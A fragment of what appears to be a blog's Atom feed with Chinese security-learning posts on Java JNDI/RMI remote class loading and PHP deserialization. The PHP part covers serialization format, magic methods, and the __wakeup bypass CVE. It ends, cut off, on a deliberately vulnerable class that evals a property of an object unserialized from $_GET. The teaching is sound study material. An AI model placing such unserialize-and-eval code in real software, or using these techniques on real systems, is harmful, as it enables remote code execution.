&#123;</span><br><span class="line">            <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">                clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> (clas != <span class="hljs-keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进第二个<code>loadClass</code>，通过<code>URLClassLoader</code>的<code>newInstance</code>生成远程类的<code>ClassLoader</code>，然后使用<code>ClassLoader</code>反射生成<code>factory</code>类的Class实例。在实例化Class的实例的时候，静态代码就会被执行，弹出计算器。</p><p><img src="/2021/08/24/JAVA反序列化学习/屏幕截图 2021-08-24 145719.png" alt></p><p>除了RMI，LDAP也是可以使用类似的方式实例化远程的恶意类，这两种利用方法都写在后续较高的Java版本被限制从远程下载并实例化<code>factory</code>类。</p><blockquote><p><em>com.sun.jndi.ldap.object.trustURLCodebase</em> 属性在 Oracle JDK 11.0.1, 8u191, 7u201, and 6u211及以后的版本，默认值为false，即不允许LDAP从远程地址加载Reference工厂类。</p><p><em>com.sun.jndi.rmi.object.trustURLCodebase</em> 属性在 Oracle JDK 8u113, 7u122, 6u132及以后的版本，默认值为false，即默认不允许RMI从远程地址加载Reference工厂类。</p></blockquote><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>距发布上一篇文章24天，你文章写快点吧大哥，炒冷饭搞这么久。后续复现下一些组件、CMS的反序列化漏洞。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/bit4woo/code2sec.com" target="_blank" rel="noopener">https://github.com/bit4woo/code2sec.com</a></p><p><a href="https://fireline.fun/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/#5-2-Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86" target="_blank" rel="noopener">https://fireline.fun/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/#5-2-Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86</a></p><p><a href="https://yoga7xm.top/2019/09/02/rmi/" target="_blank" rel="noopener">https://yoga7xm.top/2019/09/02/rmi/</a></p><p><a href="https://paper.seebug.org/1091/#java-rmi_3" target="_blank" rel="noopener">https://paper.seebug.org/1091/#java-rmi_3</a></p><p><a href="https://paper.seebug.org/1420/#_2" target="_blank" rel="noopener">https://paper.seebug.org/1420/#_2</a></p><p><a href="https://www.redteaming.top/2020/08/24/JNDI-Injection/" target="_blank" rel="noopener">https://www.redteaming.top/2020/08/24/JNDI-Injection/</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;回顾完PHP反序列化，接着就来学习Java反序列化了。距离上一篇PHP反序列化水文过去快半个月了，感觉时间过得好快啊，在某些特殊时刻也好煎熬啊。不管怎么说，这段时间看了好多Java反序列化的文章，也动手复现了下，对反序列化的原理、利用条件、利用方法有了初步的认识。 胡诌了这么多，就下来是对Java反序列化学习的记录。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化浅析</title>
    <link href="http://127.0.0.1/2021/07/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/"/>
    <id>http://127.0.0.1/2021/07/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/</id>
    <published>2021-07-30T07:48:53.000Z</published>
    <updated>2021-07-30T07:55:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>进阶的代码审计，反序列化是绕不过的坎啊。主流的几个Web开发语言，像php、C#、Java都有反序列化，其中就属php的反序列化简单易懂，反序列化的学习之路就从这里开始。</p><a id="more"></a><h2 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h2><p>如果想要持久化保存一个对象，除了将对象的内容保存在数据库中，还能将对象序列化，使其转换为一串数据。序列化使得对象的保存和传输变得更为简便，其中序列化的对象可以是类对象、变量、数组等。对象的还原则通过反序列化实现。</p><h2 id="PHP反序列化格式"><a href="#PHP反序列化格式" class="headerlink" title="PHP反序列化格式"></a>PHP反序列化格式</h2><p>序列化的对象有不同的类型，为了区分不同的类型，序列化的字符串自然有不同的格式。php常见的类型序列化后的内容如下：</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$str = <span class="hljs-string">"str"</span>;</span><br><span class="line">$int = <span class="hljs-number">1</span>;</span><br><span class="line">$float = <span class="hljs-number">1.1</span>;</span><br><span class="line">$obj = <span class="hljs-keyword">new</span> DateTime();</span><br><span class="line">$arr = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>);</span><br><span class="line">$bool = <span class="hljs-keyword">true</span>;</span><br><span class="line">$null = <span class="hljs-keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> serialize($str);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> serialize($int);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> serialize($float);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> serialize($arr);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> serialize($bool);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> serialize($null)</span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-19 153039.png" alt></p><p>开头的一个字符代表类型，后面跟着一个冒号<code>:</code>用于分隔类型和值；对于字符串类型、变量名和类名，代表类型的字符后还跟着一个数字，用于描述后面字符串的长度；相同的，类对象和数组也存在一个数字用于描述类对象属性数量或数组长度，其中属性或数组内容用一对花括号括起来，花括号里可以嵌套其他类型的序列化内容 。</p><p>除此之外还有两个不常见，但值得关注的类型描述符：大写<code>S</code>和大写<code>R</code>，大写<code>S</code>可以传入hex编码的字符，大写<code>R</code>可以从左到右与第n个反序列化的变量进行绑定。</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$hex = <span class="hljs-string">'S:3:"\31\32\33";'</span>;</span><br><span class="line">$res = <span class="hljs-string">'a:2:&#123;s:3:"abc";s:3:"abc";s:3:"res";R:2;&#125;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> unserialize($hex);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">$arr = unserialize($res);</span><br><span class="line"><span class="hljs-keyword">echo</span> var_dump($arr);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">$arr[<span class="hljs-string">"abc"</span>] = <span class="hljs-string">"def"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> var_dump($arr)</span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-19 163156.png" alt></p><p>对于php的类，其属性的访问修饰符有三种：<code>public</code>、<code>protected</code>和<code>private</code>，序列化区分访问修饰符是通过属性的标记实现的。序列化时可能会看到属性名的长度和描述的长度不一致，是因为<code>protected</code>和<code>private</code>修饰的变量名在经过序列化后包含了不可见的<code>00</code>字符。</p><p>下列代码将序列化后的<code>00</code>字符替换为url编码，就可以很直观的看到它的位置。<code>protected</code>修饰符的格式为：<code>%00*%00</code>属性名，<code>private</code>修饰符的格式为：<code>%00</code>类名<code>%00</code>属性名，<code>public</code>修饰符则直接为属性名。</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span></span><br><span class="line"><span class="hljs-class"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">public</span> $public;</span><br><span class="line">    <span class="hljs-keyword">protected</span> $protected;</span><br><span class="line">    <span class="hljs-keyword">private</span> $private;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> str_replace(<span class="hljs-string">"\x00"</span>,<span class="hljs-string">"%00"</span>,serialize(<span class="hljs-keyword">new</span> Test()));</span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-19 165846.png" alt></p><h2 id="PHP魔术函数"><a href="#PHP魔术函数" class="headerlink" title="PHP魔术函数"></a>PHP魔术函数</h2><p>反序列化不会直接控制代码的执行流程，但通过特定条件下会被自动调用的魔术方法构成POP链，可以实现命令执行、文件读写等功能。PHP中所有的魔术方法和作用如下：</p><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>__construct</td><td>构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td></tr><tr><td>__destruct</td><td>析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用</td></tr><tr><td>__toString</td><td>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如<code>echo</code>打印出对象就会调用此方法</td></tr><tr><td>__wakeup</td><td>使用<code>unserialize</code>时触发，反序列化恢复对象之前调用该方法</td></tr><tr><td>__sleep</td><td>使用<code>serialize</code>时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td>__call</td><td>在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td></tr><tr><td>__callStatic</td><td>在静态上下文中调用不可访问的方法时触发</td></tr><tr><td>__get</td><td>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td></tr><tr><td>__set</td><td>在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td></tr><tr><td>__isset</td><td>当对不可访问属性调用<code>isset()</code>或<code>empty()</code>时触发</td></tr><tr><td>__unset</td><td>当对不可访问属性调用<code>unset()</code>时触发</td></tr><tr><td>__invoke</td><td>当脚本尝试将对象调用为函数时触发</td></tr><tr><td>__serialize</td><td>serialize()函数会检查类中是否存在一个魔术方法 <code>__serialize()</code>。如果存在，该方法将在任何序列化之前优先执行。如果类中同时定义了 <code>__serialize()</code> 和 <code>__sleep()</code> 两个魔术方法，则只有 <code>__serialize()</code> 方法会被调用。</td></tr><tr><td>__unserialize</td><td><code>unserialize()</code>函数检查是否存在魔术方法<code>__unserialize()</code>。如果存在，此函数将接收从<code>__serialize()</code>返回的数组，然后根据需要从该数组中恢复对象的属性。</td></tr><tr><td>__set_status</td><td>起当调用 <code>var_export()</code>导出类时，此方法会被调用。</td></tr><tr><td>__clone</td><td>使用clone关键字来进行对象复制时<code>__clone</code>方法会被调用。</td></tr><tr><td>__debugInfo</td><td>使用<code>var_dump()</code>函数输出一个对象的属性时<code>__debuginfo</code>方法会被调用。</td></tr></tbody></table><p>魔术方法触发的方法如下：</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span></span><br><span class="line"><span class="hljs-class"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">public</span> $public;</span><br><span class="line">    <span class="hljs-keyword">protected</span> $protected;</span><br><span class="line">    <span class="hljs-keyword">private</span> $private;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"construct"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"toString"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($name,$args)</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"call"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span><span class="hljs-params">($name,$args)</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"callStatic"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span><span class="hljs-params">($name)</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"get"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span><span class="hljs-params">($name,$value)</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"set"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span><span class="hljs-params">($name)</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"isset"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span><span class="hljs-params">($name)</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"unset"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"invoke"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set_status</span><span class="hljs-params">($arr)</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"set_status"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__clone</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"clone"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__debugInfo</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"debugInfo"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__serialize</span><span class="hljs-params">()</span>: <span class="hljs-title">array</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"serialize"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="hljs-keyword">return</span> [</span><br><span class="line">            <span class="hljs-string">'public'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;public,</span><br><span class="line">            <span class="hljs-string">'protected'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;protected,</span><br><span class="line">            <span class="hljs-string">'private'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;private,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span><span class="hljs-params">(array $data)</span>: <span class="hljs-title">void</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"unserialize"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"sleep"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">'public'</span>, <span class="hljs-string">'protected'</span>, <span class="hljs-string">'private'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"wakeup"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"destruct"</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// construct</span></span><br><span class="line">$test = <span class="hljs-keyword">new</span> Test();</span><br><span class="line"><span class="hljs-comment">// toString</span></span><br><span class="line"><span class="hljs-keyword">echo</span> $test;</span><br><span class="line"><span class="hljs-comment">// call</span></span><br><span class="line">$test-&gt;fun();</span><br><span class="line"><span class="hljs-comment">// callStatic</span></span><br><span class="line">Test::fun();</span><br><span class="line"><span class="hljs-comment">// get</span></span><br><span class="line"><span class="hljs-keyword">echo</span> $test-&gt;private;</span><br><span class="line"><span class="hljs-comment">// set</span></span><br><span class="line">$test-&gt;private = <span class="hljs-string">"private"</span>;</span><br><span class="line"><span class="hljs-comment">// isset</span></span><br><span class="line"><span class="hljs-keyword">isset</span>($test-&gt;private);</span><br><span class="line"><span class="hljs-comment">// unset</span></span><br><span class="line"><span class="hljs-keyword">unset</span>($test-&gt;private);</span><br><span class="line"><span class="hljs-comment">// invoke</span></span><br><span class="line">$test();</span><br><span class="line"><span class="hljs-comment">// set_status</span></span><br><span class="line"><span class="hljs-keyword">eval</span>(var_export($test,<span class="hljs-keyword">true</span>).<span class="hljs-string">";"</span>);</span><br><span class="line"><span class="hljs-comment">// clone</span></span><br><span class="line">$test1 = <span class="hljs-keyword">clone</span> $test;</span><br><span class="line"><span class="hljs-comment">// debugInfo</span></span><br><span class="line">var_dump($test);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="hljs-comment">// serialize</span></span><br><span class="line">$ser = serialize($test);</span><br><span class="line"><span class="hljs-comment">// unserialize</span></span><br><span class="line">$unser = unserialize($ser);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">unset</span>($test);</span><br><span class="line"><span class="hljs-keyword">unset</span>($test1);</span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-20 234255.png" alt></p><p>顺便说下，<code>__serialize</code>和<code>__unserialize</code>这两个特性在php7.4以后才有效。</p><h2 id="PHP反序列化特性"><a href="#PHP反序列化特性" class="headerlink" title="PHP反序列化特性"></a>PHP反序列化特性</h2><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h3><p><code>__wakeup</code>绕过利用的不是php的某个特性，而是一个有CVE编号的漏洞，不过在我看来只是个bug，不知道为什么能分到CVE编号。受影响的版本为PHP5的5.6.25以下和PHP7的7.0.10以下。漏洞的利用很简单：当序列化字符串中描述对象属性个数的数字比实际的属性个数大，则反序列化时<code>__wakeup</code>方法则不执行。</p><p>利用场景嘛，就是以下这种<code>__wakeup</code>方法有替换或者过滤的情况。</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Weakup</span></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> $command;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;command = <span class="hljs-string">"phpinfo();"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;</span><br><span class="line">        @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = unserialize($_GET[<span 